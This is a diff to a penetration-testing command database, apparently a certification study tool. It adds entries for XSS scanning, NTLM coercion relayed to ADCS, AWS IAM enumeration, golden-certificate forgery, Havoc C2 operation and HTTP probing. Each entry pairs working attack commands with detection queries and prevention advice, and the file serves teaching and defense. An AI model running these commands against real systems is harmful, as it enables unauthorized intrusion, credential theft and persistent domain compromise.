+      "description": "DalFox (Parameter Analysis and XSS Scanning tool) is a fast XSS scanner that tests reflected, stored, and blind XSS. It analyzes parameters for reflection context, bypasses common WAF rules, and supports blind XSS with callback servers. More focused and effective than generic scanners for XSS hunting.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Web Attacks",
+      "subcategory": "Cross-Site Scripting",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "hahwul/dalfox; CWES XSS module",
+      "tags": [
+        "dalfox",
+        "xss",
+        "reflected-xss",
+        "blind-xss",
+        "waf-bypass",
+        "parameter-analysis"
+      ],
+      "mitre": [
+        "T1059.007"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  go install github.com/hahwul/dalfox/v2@latest\n  # Or: snap install dalfox\n\n=== SINGLE URL ===\n  dalfox url \"https://target.com/search?q=test\"\n\n=== WITH BLIND XSS CALLBACK ===\n  dalfox url \"https://target.com/search?q=test\" --blind https://your-bxss-server.com\n\n=== PIPE FROM OTHER TOOLS ===\n  cat params.txt | dalfox pipe --blind https://bxss.me\n  # params.txt: one URL with params per line\n\n=== FROM CRAWLED ENDPOINTS ===\n  katana -u https://target.com -jc | grep \"=\" | dalfox pipe\n\n=== USEFUL FLAGS ===\n  --waf-evasion          # Enable WAF bypass payloads\n  --custom-payload file  # Use custom payload list\n  --follow-redirect      # Follow 302s\n  --skip-mining          # Skip parameter mining\n  --output results.txt   # Save results\n  --format json          # JSON output\n  --proxy http://127.0.0.1:8080  # Through Burp\n\n=== MINING MODE ===\nDalFox can discover hidden parameters:\n  dalfox url \"https://target.com/page\" --mining-dict\n  # Tests common param names for reflection",
+      "examples": [
+        {
+          "label": "Scan URL for XSS",
+          "command": "dalfox url \"https://target.com/search?q=test\" --waf-evasion"
+        },
+        {
+          "label": "Pipe crawled endpoints for XSS",
+          "command": "katana -u https://target.com -jc | grep \"=\" | dalfox pipe --blind https://bxss.me"
+        },
+        {
+          "label": "Scan with Burp proxy",
+          "command": "dalfox url \"https://target.com/page?id=1\" --proxy http://127.0.0.1:8080 --follow-redirect"
+        }
+      ],
+      "references": [
+        {
+          "title": "DalFox - GitHub",
+          "url": "https://github.com/hahwul/dalfox"
+        },
+        {
+          "title": "MITRE T1059.007 - JavaScript",
+          "url": "https://attack.mitre.org/techniques/T1059/007/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-katana-crawler",
+          "note": "Katana finds endpoints; DalFox tests them for XSS.",
+          "rel": "prereq"
+        },
+        {
+          "id": "recon-arjun-param-discovery",
+          "note": "Arjun finds hidden parameters to feed into DalFox.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "DalFox sends XSS payloads in different encoding/context combinations and checks whether they execute. It analyzes the reflection context (HTML, attribute, JavaScript) to craft targeted payloads.",
+        "prerequisites": "Target URLs with parameters that reflect user input.",
+        "impact": "Identifies exploitable XSS vulnerabilities that can lead to session hijacking, credential theft, or client-side attacks.",
+        "detection": "[MITRE T1059.007] XSS payloads in HTTP parameters; script injection patterns in web server logs.",
+        "artifacts": "WAF logs showing blocked XSS payloads; web server logs with script tags in parameters.",
+        "splunk_spl": "index=web sourcetype=access_combined\n| where match(uri_query, \"(?i)<script|javascript:|onerror|onload|alert\\(|document\\.cookie\")\n| table _time, src_ip, uri_path, uri_query",
+        "elastic_kql": "url.query:(*script* OR *onerror* OR *javascript:* OR *alert(*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriQuery matches regex @\"(?i)<script|javascript:|onerror|onload|alert\\(|document\\.cookie\"\n| project TimeGenerated, cIP, csUriStem, csUriQuery",
+        "sigma_rules": "web_xss_payload_in_request",
+        "prevention": "Content Security Policy (CSP); output encoding; input validation; WAF with XSS rule sets; HttpOnly cookies.",
+        "sources": [
+          "CWES XSS module",
+          "https://attack.mitre.org/techniques/T1059/007/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "XSS payload in HTTP request",
+            "logic": "title: XSS Payload Detected in HTTP Request\nstatus: experimental\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-uri-query|contains:\n      - \"<script\"\n      - \"javascript:\"\n      - \"onerror=\"\n      - \"onload=\"\n      - \"document.cookie\"\n  condition: selection\nlevel: high",
+            "data_source": "iis",
+            "attack": [
+              "T1059.007"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Security scanning tools; penetration testing",
+            "tuning": "Whitelist known scanner IPs; correlate with WAF blocks"
+          }
+        ]
+      }
+    },
+    {
       "id": "crtp-dcsync",
       "name": "DCSync (SafetyKatz / impacket-secretsdump)",
       "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\krbtgt\" \"exit\"",
@@ -31528,6 +32148,108 @@ const COMMAND_DATA = {
         "T1027",
         "T1059"
       ]
+    },
+    {
+      "id": "ad-dfscoerce",
+      "name": "DFSCoerce - NTLM Coercion via MS-DFSNM",
+      "command": "python3 dfscoerce.py -u <user> -p <pass> -d <domain> -dc-ip <dc_ip> <listener_ip>",
+      "description": "DFSCoerce abuses the MS-DFSNM (Distributed File System Namespace Management) protocol to coerce NTLM authentication from a target server. Like PetitPotam but uses a different RPC interface (netdfs). Combined with ntlmrelayx targeting ADCS HTTP enrollment (ESC8) or LDAP, it enables domain compromise from a low-privileged user.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "Coercion & Relay",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "FiloSottile/dfscoerce; CRTP coercion module",
+      "tags": [
+        "dfscoerce",
+        "ms-dfsnm",
+        "ntlm-coercion",
+        "relay",
+        "adcs",
+        "esc8"
+      ],
+      "mitre": [
+        "T1187",
+        "T1557.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nMS-DFSNM provides RPC calls (NetrDfsRemoveStdRoot, NetrDfsAddStdRoot)\nthat trigger the target to authenticate back to an attacker-controlled\nlistener. This NTLM auth can be relayed to ADCS, LDAP, or SMB.\n\n=== INSTALL ===\n  git clone https://github.com/Shutdown06/DFSCoerce\n  pip3 install impacket\n\n=== RELAY CHAIN (with ADCS ESC8) ===\n  # Terminal 1 - start relay to ADCS web enrollment\n  ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n  # Terminal 2 - trigger coercion\n  python3 dfscoerce.py -u <user> -p <pass> -d <domain> -dc-ip <dc_ip> <listener_ip>\n  # Terminal 3 - use the certificate\n  python3 gettgtpkinit.py <domain>/<dc_name>$ <dc_name>.ccache -cert-pfx <dc_name>.pfx\n\n=== ALTERNATIVE COERCERS ===\nCoercer.py combines multiple protocols (MS-EFSR, MS-RPRN, MS-DFSNM,\nMS-FSRVP) into one tool. Use it to test all methods at once.",
+      "examples": [
+        {
+          "label": "Coerce DC authentication via DFS",
+          "command": "python3 dfscoerce.py -u jdoe -p Password123 -d corp.local -dc-ip 192.168.1.10 192.168.1.50"
+        },
+        {
+          "label": "Relay chain with ADCS ESC8",
+          "command": "ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+        },
+        {
+          "label": "Multi-protocol coercion with Coercer",
+          "command": "python3 Coercer.py -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip>"
+        }
+      ],
+      "references": [
+        {
+          "title": "DFSCoerce - GitHub",
+          "url": "https://github.com/Shutdown06/DFSCoerce"
+        },
+        {
+          "title": "Coercer - Multi-protocol",
+          "url": "https://github.com/p0dalirius/Coercer"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-shadowcoerce",
+          "note": "Another NTLM coercion method via MS-FSRVP. Chain both for coverage.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cdsa-m06-pki-esc8",
+          "note": "Relay coerced auth to ADCS HTTP enrollment for domain takeover.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "MS-DFSNM RPC calls trigger NTLM authentication callbacks from the target server to an attacker-specified UNC path. The relayed credential can authenticate to other services.",
+        "prerequisites": "Valid domain credentials; network access to target RPC (TCP 445) and relay target.",
+        "impact": "Domain compromise when relayed to ADCS (ESC8) or LDAP for RBCD/Shadow Credentials.",
+        "detection": "[MITRE T1187] RPC calls to the DFS Namespace service from unusual sources; NTLM relay indicators.",
+        "artifacts": "Windows Security Event 4624 (Type 3) from unexpected sources; ADCS enrollment logs; Sysmon network connections.",
+        "splunk_spl": "index=windows EventCode=4624 LogonType=3 TargetUserName=\"*$\"\n| where like(IpAddress, \"10.%\") OR like(IpAddress, \"192.168.%\")\n| stats count by TargetUserName, IpAddress\n| where count > 5",
+        "elastic_kql": "event.code:\"4624\" AND winlog.event_data.LogonType:\"3\" AND user.name:*$",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| summarize count() by TargetUserName, IpAddress\n| where count_ > 5",
+        "sigma_rules": "win_security_ntlm_relay_dfs_coercion",
+        "prevention": "Enforce EPA (Extended Protection for Authentication) on ADCS web enrollment; disable NTLM where possible; require SMB signing; restrict RPC access to DFS services.",
+        "sources": [
+          "CRTP coercion module",
+          "https://attack.mitre.org/techniques/T1187/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "DFSCoerce - Anomalous machine account NTLM authentication",
+            "logic": "SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| where AuthenticationPackageName == \"NTLM\"\n| summarize AuthCount=count() by TargetUserName, IpAddress, bin(TimeGenerated, 5m)\n| where AuthCount > 3",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4624"
+            ],
+            "attack": [
+              "T1187",
+              "T1557.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate DFS operations; domain controller replication",
+            "tuning": "Baseline normal machine account authentication patterns; alert on new source IPs"
+          }
+        ]
+      }
     },
     {
       "id": "crtp-diamond-ticket",
@@ -40859,6 +41581,92 @@ const COMMAND_DATA = {
       "explain": "The modern rewrite of enum4linux with structured output:\n  enum4linux-ng   Python reimplementation\n  -P <dc_ip>      dump the password policy\n  -oA <outfile>   save results to JSON and YAML\nUse -P first to learn the lockout threshold before spraying; -A runs the full suite, and -u/-p adds authentication."
     },
     {
+      "id": "cloud-enumerate-iam",
+      "name": "enumerate-iam - AWS IAM Permission Enumeration",
+      "command": "python3 enumerate-iam.py --access-key <aws_key> --secret-key <aws_secret> --session-token <token>",
+      "description": "enumerate-iam brute-forces AWS IAM permissions by attempting every API call and recording which ones succeed. Given a set of AWS credentials, it determines what the identity can actually do across all AWS services. Essential for assessing compromised AWS credentials and finding privilege escalation paths.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Cloud Security",
+      "subcategory": "AWS Enumeration",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "andresriancho/enumerate-iam; cloud pentest methodology",
+      "tags": [
+        "enumerate-iam",
+        "aws",
+        "iam",
+        "cloud-enum",
+        "permission-enumeration",
+        "privilege-escalation"
+      ],
+      "mitre": [
+        "T1087.004",
+        "T1580"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  git clone https://github.com/andresriancho/enumerate-iam\n  cd enumerate-iam\n  pip3 install -r requirements.txt\n\n=== RUN ===\n  python3 enumerate-iam.py --access-key AKIA... --secret-key wJa...\n  # With session token (for temporary credentials):\n  python3 enumerate-iam.py --access-key AKIA... --secret-key wJa... --session-token FwoG...\n\n=== WHAT IT DOES ===\n- Calls sts:GetCallerIdentity first (always works)\n- Then brute forces ~4000+ API calls across all services\n- Records which calls return data vs AccessDenied\n- Output shows allowed actions\n\n=== ALTERNATIVE: Pacu ===\n  # Pacu is a full AWS exploitation framework:\n  pacu\n  > set_keys\n  > run iam__enum_permissions\n  > run iam__privesc_scan\n\n=== COMMON ESCALATION PATHS ===\n- iam:CreatePolicyVersion (change own permissions)\n- iam:AttachUserPolicy (attach admin policy)\n- iam:PassRole + lambda:CreateFunction (exec as role)\n- sts:AssumeRole to cross-account roles\n- ssm:SendCommand to EC2 instances",
+      "examples": [
+        {
+          "label": "Enumerate IAM permissions",
+          "command": "python3 enumerate-iam.py --access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+        },
+        {
+          "label": "With session token (temporary creds)",
+          "command": "python3 enumerate-iam.py --access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXUtnFEMI --session-token FwoGZXIvYXdzE..."
+        },
+        {
+          "label": "Check caller identity first",
+          "command": "aws sts get-caller-identity"
+        }
+      ],
+      "references": [
+        {
+          "title": "enumerate-iam - GitHub",
+          "url": "https://github.com/andresriancho/enumerate-iam"
+        },
+        {
+          "title": "MITRE T1087.004 - Cloud Account Discovery",
+          "url": "https://attack.mitre.org/techniques/T1087/004/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AWS IAM permissions are not visible through a single API call. The tool brute-forces all service endpoints to discover what actions the credential is authorized to perform. AccessDenied errors are expected and do not trigger lockouts.",
+        "prerequisites": "Valid AWS access key, secret key, and optionally session token.",
+        "impact": "Complete visibility into compromised credentials capabilities; identifies privilege escalation paths.",
+        "detection": "[MITRE T1087.004] Massive spike in API calls across many services; most returning AccessDenied; CloudTrail AccessDenied anomaly.",
+        "artifacts": "CloudTrail logs showing thousands of API calls with AccessDenied errors from a single identity.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail errorCode=\"AccessDenied\"\n| stats dc(eventName) as unique_apis, count by userIdentity.arn\n| where unique_apis > 100\n| sort -unique_apis",
+        "elastic_kql": "cloud.provider:\"aws\" AND event.outcome:\"failure\" AND aws.cloudtrail.error_code:\"AccessDenied\"",
+        "sentinel_kql": "AWSCloudTrail\n| where ErrorCode == \"AccessDenied\"\n| summarize UniqueAPIs=dcount(EventName), TotalCalls=count() by UserIdentityArn\n| where UniqueAPIs > 100",
+        "sigma_rules": "aws_iam_brute_force_permissions",
+        "prevention": "Enable CloudTrail anomaly detection; alert on high AccessDenied rates; use AWS GuardDuty; implement least privilege; rotate compromised credentials immediately.",
+        "sources": [
+          "Cloud pentest methodology",
+          "https://attack.mitre.org/techniques/T1087/004/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "AWS IAM permission enumeration brute force",
+            "logic": "AWSCloudTrail\n| where ErrorCode == \"AccessDenied\"\n| summarize UniqueAPIs=dcount(EventName), TotalCalls=count(), Services=dcount(EventSource) by UserIdentityArn, bin(TimeGenerated, 15m)\n| where UniqueAPIs > 50 and Services > 10",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1087.004",
+              "T1580"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Poorly configured automation with overly broad API calls",
+            "tuning": "Adjust threshold based on environment; correlate with known automation identities"
+          }
+        ]
+      }
+    },
+    {
       "type": "cheatsheet",
       "platform": "linux",
       "requires": [
@@ -47076,6 +47884,109 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Forges an inter-realm referral TGT using the shared forest trust key to reach a trusted external forest:\n  golden /rc4:<nt_hash>     here <nt_hash> is the trust key from lsadump::trust /patch\n  /domain:<domain> /sid:<domain_sid>   your (source) domain and SID\n  /sids:<target_enterprise_admin_sid>  target forest privileged SID\n  /service:krbtgt /target:<target_domain>   forge a referral ticket toward the target realm\n  /ptt                      inject it\nThen Rubeus asktgs for a service (e.g. cifs/<dc>) in the target forest. Note: SID filtering across a forest trust usually blocks EA SIDs, so this typically yields only trust-permitted access."
+    },
+    {
+      "id": "ad-forgecert",
+      "name": "ForgeCert - Golden Certificate (Stolen CA Key)",
+      "command": "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword <pass> --Subject \"CN=Administrator,CN=Users,DC=<domain_short>,DC=local\" --SubjectAltName administrator@<domain> --NewCertPath admin.pfx --NewCertPassword <pass>",
+      "description": "ForgeCert forges certificates using a stolen CA private key (the \"Golden Certificate\" attack - DPERSIST1). With the CA cert and key, you can create certificates for ANY user, bypassing all template restrictions. This is the certificate equivalent of a Golden Ticket - persistent domain compromise until the CA key is rotated.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP ADCS persistence; GhostPack/ForgeCert",
+      "tags": [
+        "forgecert",
+        "golden-certificate",
+        "adcs",
+        "persistence",
+        "dpersist1",
+        "ca-key"
+      ],
+      "mitre": [
+        "T1649",
+        "T1556.006"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== STEP 1: STEAL THE CA KEY ===\n  # From the CA server (requires local admin on CA):\n  # Option A - Certipy (Linux)\n  certipy ca -backup -ca <ca_name> -u administrator@<domain> -p <pass>\n  # Option B - SharpDPAPI (Windows)\n  SharpDPAPI.exe certificates /machine\n  # Option C - Mimikatz\n  crypto::capi\n  crypto::certificates /export /systemstore:LOCAL_MACHINE\n\n=== STEP 2: FORGE CERTIFICATE ===\n  ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=Administrator,CN=Users,DC=corp,DC=local\" --SubjectAltName administrator@corp.local --NewCertPath admin.pfx --NewCertPassword \"password\"\n\n=== STEP 3: AUTHENTICATE ===\n  # Rubeus (Windows)\n  Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:password /ptt\n  # Certipy (Linux)\n  certipy auth -pfx admin.pfx -dc-ip <dc_ip>\n\n=== PERSISTENCE VALUE ===\nCA certificates typically have 5+ year lifetimes. A stolen CA key\nallows forging certs until the CA is rebuilt from scratch.\nPassword resets do NOT invalidate forged certificates.",
+      "examples": [
+        {
+          "label": "Forge admin certificate with stolen CA key",
+          "command": "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=Administrator,CN=Users,DC=corp,DC=local\" --SubjectAltName administrator@corp.local --NewCertPath admin.pfx --NewCertPassword \"password\""
+        },
+        {
+          "label": "Backup CA key with Certipy",
+          "command": "certipy ca -backup -ca corp-CA -u administrator@corp.local -hashes :<hash>"
+        },
+        {
+          "label": "Authenticate with forged certificate",
+          "command": "Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:password /ptt"
+        }
+      ],
+      "references": [
+        {
+          "title": "ForgeCert - GhostPack",
+          "url": "https://github.com/GhostPack/ForgeCert"
+        },
+        {
+          "title": "SpecterOps - Certified Pre-Owned",
+          "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-esc1-certipy-linux",
+          "note": "ESC1 gets initial cert abuse; ForgeCert is post-compromise persistence.",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-adcs-esc1",
+          "note": "Certipy-based ESC1 exploitation leads to ForgeCert for persistence.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The CA private key is the root of trust for all certificates. With it, any certificate can be forged with arbitrary SANs, bypassing template and enrollment restrictions entirely.",
+        "prerequisites": "Local admin on the CA server to extract the CA private key and certificate.",
+        "impact": "Persistent domain compromise; forged certificates survive password resets and remain valid for years.",
+        "detection": "[MITRE T1649] Certificates issued outside normal ADCS enrollment (no corresponding 4886/4887 events); Certipy/Rubeus PKINIT auth with unexpected certificates.",
+        "artifacts": "Missing Event 4886/4887 (certificate request/issue) for the forged cert; Event 4768 with certificate-based pre-auth; CA private key access logs.",
+        "splunk_spl": "index=windows EventCode=4768 PreAuthType=16\n| eval cert_auth=\"PKINIT\"\n| join TargetUserName [search index=windows EventCode=4887 | stats count by TargetUserName]\n| where isnull(count)\n| table _time, TargetUserName, IpAddress",
+        "elastic_kql": "event.code:\"4768\" AND winlog.event_data.PreAuthType:\"16\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4768 and PreAuthType == \"16\"\n| project TimeGenerated, TargetUserName, IpAddress, ServiceName",
+        "sigma_rules": "win_security_golden_certificate_pkinit",
+        "prevention": "Protect CA private key with HSM; monitor CA backup operations; audit 4768 events with PKINIT pre-auth; implement certificate transparency logging.",
+        "sources": [
+          "CRTP ADCS module",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Golden Certificate - PKINIT auth without matching issuance",
+            "logic": "let pkinit_auths = SecurityEvent\n| where EventID == 4768 and PreAuthType == \"16\"\n| project AuthTime=TimeGenerated, TargetUserName, IpAddress;\nlet cert_issues = SecurityEvent\n| where EventID == 4887\n| project IssueTime=TimeGenerated, RequesterName;\npkinit_auths\n| join kind=leftanti (cert_issues) on $left.TargetUserName == $right.RequesterName\n| project AuthTime, TargetUserName, IpAddress",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4768",
+              "4887"
+            ],
+            "attack": [
+              "T1649",
+              "T1556.006"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Smart card authentication with pre-provisioned certificates",
+            "tuning": "Correlate with ADCS enrollment logs; whitelist known smart card users"
+          }
+        ]
+      }
     },
     {
       "id": "ad-fping-sweep",
@@ -55736,6 +56647,92 @@ const COMMAND_DATA = {
       "explain": "Identifies an unknown hash and prints its hashcat mode:\n  hashid                   the identifier\n  -m                       also print the matching Hashcat mode number\n  '<hash>'                 the hash to analyze\nUse the printed mode with hashcat -m; -j shows the John format, -mje reads a file and shows both plus extended info. Always confirm the mode before a long crack."
     },
     {
+      "id": "ad-havoc-c2",
+      "name": "Havoc C2 - Modern Command & Control Framework",
+      "command": "./havoc server --profile profiles/default.yaotl",
+      "description": "Havoc is a modern, open-source C2 framework designed as a Cobalt Strike alternative. It features a Demon agent with sleep obfuscation (Ekko/Foliage), indirect syscalls, SMB/HTTP/HTTPS listeners, BOF (Beacon Object File) compatibility, and a Qt-based teamserver GUI. Used in advanced engagements where Cobalt Strike is unavailable.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Post-Exploitation",
+      "subcategory": "Command & Control",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "HavocFramework/Havoc; modern C2 methodology",
+      "tags": [
+        "havoc",
+        "c2",
+        "command-and-control",
+        "demon",
+        "cobalt-strike-alternative",
+        "bof"
+      ],
+      "mitre": [
+        "T1071.001",
+        "T1573.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  git clone https://github.com/HavocFramework/Havoc\n  cd Havoc\n  make ts-build    # Build teamserver\n  make client-build # Build client GUI\n\n=== START TEAMSERVER ===\n  ./havoc server --profile profiles/default.yaotl\n  # Profile defines listeners, operators, demon config\n\n=== CONNECT CLIENT ===\n  ./havoc client\n  # Connect to teamserver IP:40056\n\n=== GENERATE DEMON PAYLOAD ===\n  # In GUI: Payloads > Generate\n  # Options: Windows EXE/DLL/Shellcode, Sleep technique (Ekko/Foliage)\n  # Indirect syscalls: Yes (bypasses EDR hooks)\n\n=== KEY FEATURES ===\n- Demon agent: sleep obfuscation, indirect syscalls, stack spoofing\n- BOF support: run Cobalt Strike BOFs directly\n- SMB pivoting: lateral movement through named pipes\n- COFF loader: execute compiled C code in-memory\n- Token manipulation: steal/impersonate tokens\n- Inline assembly: execute shellcode in Demon process\n\n=== MODULES (post-exploitation) ===\n  dotnet inline-execute Rubeus.exe kerberoast\n  bof inline-execute nanodump.x64.o\n  shellcode inject x64 <pid> /path/to/shellcode.bin\n  token steal <pid>",
+      "examples": [
+        {
+          "label": "Start Havoc teamserver",
+          "command": "./havoc server --profile profiles/default.yaotl"
+        },
+        {
+          "label": "Demon - execute .NET in memory",
+          "command": "dotnet inline-execute Rubeus.exe kerberoast"
+        },
+        {
+          "label": "Demon - BOF execution",
+          "command": "bof inline-execute nanodump.x64.o"
+        }
+      ],
+      "references": [
+        {
+          "title": "Havoc Framework - GitHub",
+          "url": "https://github.com/HavocFramework/Havoc"
+        },
+        {
+          "title": "MITRE T1071.001 - Web Protocols C2",
+          "url": "https://attack.mitre.org/techniques/T1071/001/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Havoc uses indirect syscalls to bypass EDR userland hooks, sleep obfuscation (Ekko/Foliage) to avoid memory scanning, and encrypted C2 channels. The Demon agent is fully in-memory with no on-disk artifacts.",
+        "prerequisites": "Havoc teamserver running; initial code execution on target for payload delivery.",
+        "impact": "Full remote control of compromised systems; lateral movement; credential theft; data exfiltration.",
+        "detection": "[MITRE T1071.001] HTTP/HTTPS beaconing patterns; indirect syscall indicators; sleep obfuscation memory artifacts.",
+        "artifacts": "Network beaconing to C2 server; named pipe creation for SMB pivoting; in-memory .NET assembly loading.",
+        "splunk_spl": "index=sysmon (EventCode=3 AND NOT dest_port IN (80,443,53))\n| stats count by Image, dest_ip, dest_port\n| where count > 10\n| sort -count",
+        "elastic_kql": "event.code:\"3\" AND NOT destination.port:(80 OR 443 OR 53)",
+        "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort !in (80, 443, 53)\n| summarize ConnectionCount=count() by InitiatingProcessFileName, RemoteIP, RemotePort, bin(Timestamp, 1h)\n| where ConnectionCount > 10",
+        "sigma_rules": "net_connection_beacon_pattern",
+        "prevention": "EDR with kernel-level telemetry; network monitoring for beaconing; block unknown outbound connections; application allowlisting.",
+        "sources": [
+          "HavocFramework",
+          "https://attack.mitre.org/techniques/T1071/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "C2 beaconing pattern detection",
+            "logic": "DeviceNetworkEvents\n| where ActionType == \"ConnectionSuccess\"\n| summarize Connections=count(), AvgInterval=avg(Timestamp - prev(Timestamp)) by InitiatingProcessFileName, RemoteIP, bin(Timestamp, 1h)\n| where Connections > 20\n| project InitiatingProcessFileName, RemoteIP, Connections",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1071.001",
+              "T1573.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Auto-update services; health check endpoints; legitimate polling applications",
+            "tuning": "Analyze jitter patterns; compare against known-good beaconing (Windows Update, AV updates)"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -57471,6 +58468,93 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Sends an OPTIONS request and reads the Allow response header to list the HTTP methods the server accepts.:\n  -i -X  input file / interface\n  <ip>   target IP address\nLook for a header like: Allow: POST,OPTIONS,HEAD,GET."
+    },
+    {
+      "id": "recon-httpx-probe",
+      "name": "httpx - Fast HTTP Probe & Tech Fingerprinting",
+      "command": "cat subdomains.txt | httpx -sc -cl -title -tech-detect -follow-redirects -o alive.txt",
+      "description": "httpx is a fast multi-purpose HTTP toolkit by ProjectDiscovery. It probes hosts for live HTTP services, fingerprints technologies, extracts titles, status codes, content lengths, and more. Essential for filtering alive hosts from large subdomain lists and identifying interesting targets quickly.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Reconnaissance",
+      "subcategory": "Web Enumeration",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "ProjectDiscovery/httpx; HTB Academy web recon",
+      "tags": [
+        "httpx",
+        "http-probe",
+        "web-recon",
+        "technology-detection",
+        "projectdiscovery",
+        "alive-check"
+      ],
+      "mitre": [
+        "T1595.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest\n  # Or: apt install httpx / brew install httpx\n\n=== BASIC PROBING ===\n  cat subdomains.txt | httpx -sc -cl -title -tech-detect -follow-redirects\n  # -sc = status code, -cl = content length, -title = page title\n  # -tech-detect = Wappalyzer-based tech fingerprinting\n\n=== FILTER BY STATUS ===\n  cat hosts.txt | httpx -mc 200,301,302,403 -o alive.txt\n\n=== SCREENSHOT + FULL RECON ===\n  cat subs.txt | httpx -sc -title -tech-detect -favicon -jarm -screenshot -o full_recon.txt\n\n=== CHAIN WITH OTHER TOOLS ===\n  subfinder -d <target> -silent | httpx -silent -sc -title | tee alive_hosts.txt\n  cat alive_hosts.txt | nuclei -t cves/\n\n=== USEFUL FLAGS ===\n  -ports 80,443,8080,8443    # Custom ports\n  -rate-limit 50             # Throttle requests\n  -threads 25                # Concurrency\n  -json                      # JSON output\n  -cdn                       # Detect CDN/WAF\n  -ip                        # Show resolved IP",
+      "examples": [
+        {
+          "label": "Probe subdomains with full details",
+          "command": "cat subdomains.txt | httpx -sc -cl -title -tech-detect -follow-redirects -o alive.txt"
+        },
+        {
+          "label": "Chain subfinder to httpx to nuclei",
+          "command": "subfinder -d target.com -silent | httpx -silent | nuclei -t cves/"
+        },
+        {
+          "label": "Screenshot all alive hosts",
+          "command": "cat hosts.txt | httpx -screenshot -sc -title -tech-detect"
+        }
+      ],
+      "references": [
+        {
+          "title": "httpx - ProjectDiscovery",
+          "url": "https://github.com/projectdiscovery/httpx"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-amass-subdomains",
+          "note": "Amass finds subdomains; httpx probes them for alive HTTP services.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "httpx sends HTTP requests to enumerate web services, extract headers, and fingerprint technologies. It is designed for speed and can probe thousands of hosts quickly.",
+        "prerequisites": "Target host list or piped input from subdomain enumeration tools.",
+        "impact": "Identifies alive web services, technologies in use, and potential attack surface for further exploitation.",
